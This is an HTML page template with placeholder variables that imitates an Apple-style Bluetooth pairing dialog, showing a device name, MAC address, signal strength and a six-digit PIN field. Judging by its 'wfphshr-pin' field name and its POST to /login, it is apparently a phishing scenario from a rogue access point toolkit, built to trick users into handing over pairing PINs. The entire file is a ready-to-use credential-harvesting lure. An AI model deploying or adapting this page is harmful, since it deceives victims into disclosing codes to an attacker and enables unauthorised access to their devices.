<!DOCTYPE html>
<html lang="{{html_lang}}">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{page_title}}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: #6d6d72;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .sheet {
            background: rgba(248, 248, 248, 0.97);
            border-radius: 14px;
            padding: 28px 22px 22px;
            width: 100%;
            max-width: 360px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.35), 0 0 0 0.5px rgba(0, 0, 0, 0.12);
        }
        /* Bluetooth emblem — CSS only (no img/svg) */
        .ble-emblem {
            width: 52px;
            height: 56px;
            margin: 0 auto 16px;
            position: relative;
        }
        .ble-stem {
            position: absolute;
            left: 15px;
            top: 6px;
            width: 4px;
            height: 44px;
            background: #007aff;
            border-radius: 2px;
        }
        .ble-arm {
            position: absolute;
            left: 19px;
            height: 4px;
            background: #007aff;
            border-radius: 2px;
            transform-origin: left center;
        }
        .ble-arm.t1 { top: 13px; width: 22px; transform: rotate(-40deg); }
        .ble-arm.t2 { top: 13px; width: 22px; transform: rotate(40deg); }
        .ble-arm.b1 { top: 39px; width: 22px; transform: rotate(40deg); }
        .ble-arm.b2 { top: 39px; width: 22px; transform: rotate(-40deg); }
        h1 {
            text-align: center;
            color: #000;
            font-size: 1.02rem;
            font-weight: 600;
            letter-spacing: -0.02em;
        }
        .device-name {
            text-align: center;
            color: #007aff;
            font-size: 0.88rem;
            margin: 8px 0 18px;
            font-weight: 600;
        }
        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid rgba(60, 60, 67, 0.18);
            font-size: 0.8rem;
            color: #636366;
        }
        .info-row .val { color: #1c1c1e; font-weight: 500; }
        .pin-block { margin-top: 20px; }
        .pin-block label {
            display: block;
            text-align: center;
            color: #636366;
            font-size: 0.72rem;
            margin-bottom: 10px;
            font-weight: 500;
        }
        .pin-block input {
            width: 100%;
            padding: 12px 14px;
            font-size: 1.25rem;
            font-weight: 600;
            letter-spacing: 0.35em;
            text-align: center;
            border: 1px solid rgba(60, 60, 67, 0.29);
            border-radius: 10px;
            background: #fff;
            color: #000;
            font-family: ui-monospace, "Cascadia Mono", monospace;
        }
        .pin-block input:focus {
            outline: none;
            border-color: #007aff;
            box-shadow: 0 0 0 3px rgba(0, 122, 255, 0.2);
        }
        .btn {
            width: 100%;
            padding: 13px;
            background: #007aff;
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            margin-top: 14px;
            font-family: inherit;
        }
        .btn:hover { filter: brightness(1.05); }
        .btn-cancel {
            display: block;
            width: 100%;
            margin-top: 10px;
            padding: 10px;
            text-align: center;
            color: #007aff;
            font-size: 0.95rem;
            font-weight: 400;
            background: none;
            border: none;
            cursor: pointer;
            font-family: inherit;
        }
        .note {
            text-align: center;
            font-size: 0.65rem;
            color: #8e8e93;
            margin-top: 14px;
            line-height: 1.35;
        }
    </style>
</head>
<body>
    <div class="sheet">
        <div class="ble-emblem" aria-hidden="true">
            <span class="ble-stem"></span>
            <span class="ble-arm t1"></span>
            <span class="ble-arm t2"></span>
            <span class="ble-arm b1"></span>
            <span class="ble-arm b2"></span>
        </div>
        <h1>{{heading}}</h1>
        <p class="device-name">{{device_name}}</p>

        <div class="info-row"><span>{{type_label}}</span><span class="val">{{type_value}}</span></div>
        <div class="info-row"><span>{{mac_label}}</span><span class="val">{{mac_value}}</span></div>
        <div class="info-row"><span>{{signal_label}}</span><span class="val">{{signal_value}}</span></div>

        <form method="POST" action="/login">
            <div class="pin-block">
                <label for="wf-pin">{{label_pin}}</label>
                <input type="text" id="wf-pin" name="wfphshr-pin" placeholder="{{placeholder_pin}}"
                       maxlength="6" minlength="6" pattern="[0-9]{6}" inputmode="numeric" required autocomplete="one-time-code">
            </div>
            <button type="submit" class="btn">{{btn_pair}}</button>
        </form>
        <button type="button" class="btn-cancel">{{btn_cancel}}</button>
        <p class="note">{{footer_note}}</p>
    </div>
</body>
</html>
